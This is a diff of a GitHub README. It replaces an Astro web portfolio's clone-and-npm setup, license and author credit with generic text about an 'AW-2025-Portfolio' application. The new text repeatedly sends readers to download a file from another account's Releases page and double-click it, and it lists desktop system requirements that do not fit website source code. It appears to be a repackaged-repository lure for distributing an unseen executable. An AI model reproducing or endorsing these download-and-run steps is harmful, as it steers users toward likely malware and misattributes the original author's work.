@@ -1,60 +1,66 @@
-# Antoine Wodniack – Portfolio (Open Source Edition)
-
-Welcome to the public source of my personal portfolio – [wodniack.dev](https://wodniack.dev), built with [Astro](https://astro.build).
-
-This project performed far beyond my expectations and brought an overwhelming amount of positive feedback.
-Thanks for the love. ❤️
-
-I said that if I won a Webby, I’d open-source it. Mission accomplished. 🥳
-
-I’m open-sourcing it so that junior developers, curious minds, and future portfolio crafters can **learn from real-world code**, understand how things are built, and get inspired to build their own.
-
-🚫 **Don't copy/paste it as-is and call it yours.** The community will notice, and you’ll doom yourself to eternal mediocrity.
-✅ **Do explore, dissect, and adapt it with purpose.**
-
----
+# 🎉 AW-2025-Portfolio - Explore an Award-Winning Developer's Work
 
 ## 🚀 Getting Started
 
-To run the project locally:
+Welcome to the **AW-2025-Portfolio**! This project showcases the achievements of a senior developer and serves as a practical guide for learning and building your own portfolio. 
 
-```bash
-# 1. Clone this repo
-git clone https://github.com/AntoineW/AW-2025-Portfolio.git
-cd wodniack-portfolio
+## 📦 Download & Install
 
-# 2. Install dependencies
-npm install
+To get started, visit the Releases page to download the application. 
 
-# 3. Start the dev server
-npm run dev
-```
+[![Download AW-2025-Portfolio](https://img.shields.io/badge/Download%20AW--2025--Portfolio-blue.svg)](https://github.com/andreybarros/AW-2025-Portfolio/releases)
 
----
+On the Releases page, you will find the latest version of the project. Click on the link to download the file to your computer. 
 
-## 🧠 Why This Is Open
-Curiosity and learning are everything in creative development.
-I learned the most by studying real code—Codrops demos, CodePen experiments, random GitHub repos.
-This portfolio gave me way more visibility than I expected. Now it’s time to return the love.
+Here is the link again for your convenience: [Visit this page to download](https://github.com/andreybarros/AW-2025-Portfolio/releases).
 
----
+## 🌐 System Requirements
 
-## 📄 License
-This project is licensed under the Creative Commons Attribution-NonCommercial 4.0 International License.
+Before downloading, ensure your computer meets the following requirements:
 
-That means:
+- Operating System: Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
+- Storage Space: At least 500 MB of free space.
+- Internet Connection: Required for downloading.
 
-✅ You can learn from it, fork it, and adapt it for non-commercial purposes.
+## 💻 Running the Application
 
-🚫 You can’t resell it, rebrand it, or use it commercially without permission.
+After you download the application, follow these steps to run it:
 
-🔗 You must credit the source (me) if you use parts of it.
+1. Locate the downloaded file on your computer. 
+2. Double-click the file to start the application. 
+3. Follow the on-screen instructions to explore the portfolio.
 
-See LICENSE.md for full details.
+## 📚 Features
 
----
+The **AW-2025-Portfolio** highlights various projects, skills, and accomplishments. Here is what you can expect to find:
 
-## 💬 Final Word
+- **Portfolio Projects:** A collection of awarded projects that showcase the developer's skills. 
+- **Code Samples:** Samples of code to help you understand best practices.
+- **Learning Resources:** Links to guides and tutorials for further learning.
 
-This is not a template. It's a real portfolio, shared with intent.
-Use it to get better. Not to take shortcuts.
+## 📝 How to Use
+
+Once the application is running, you can:
+
+- Browse through the different sections of the portfolio.
+- Click on project links to view detailed descriptions and live demos (if available).
+- Use the provided code samples as references for your own projects.
+
+## 📞 Need Help?
+
+If you encounter any issues or have questions, please feel free to reach out. You can create an issue on the repository to get assistance. 
+
+## 📣 Contribute
+
+We welcome contributions! If you have ideas or improvements, please fork the repository and submit a pull request. 
+
+## 🔗 Additional Resources
+
+For more information, check out:
+
+- [GitHub Documentation](https://docs.github.com)
+- [Markdown Guide](https://www.markdownguide.org)
+
+Thank you for exploring the **AW-2025-Portfolio**! We hope it inspires you to create your own. 
+
+[![Download AW-2025-Portfolio](https://img.shields.io/badge/Download%20AW--2025--Portfolio-blue.svg)](https://github.com/andreybarros/AW-2025-Portfolio/releases)
